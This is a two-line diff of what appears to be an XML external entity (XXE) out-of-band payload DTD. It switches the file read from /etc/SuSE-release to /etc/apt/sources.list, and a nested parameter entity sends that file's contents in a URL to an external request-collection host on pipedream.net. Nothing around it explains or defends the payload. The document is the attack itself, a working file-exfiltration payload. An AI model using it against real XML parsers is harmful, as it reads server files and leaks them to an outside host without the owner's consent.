@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/SuSE-release">
+<!ENTITY % file SYSTEM "file:///etc/apt/sources.list">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enyr00wmiyji.x.pipedream.net/?%file;'>">
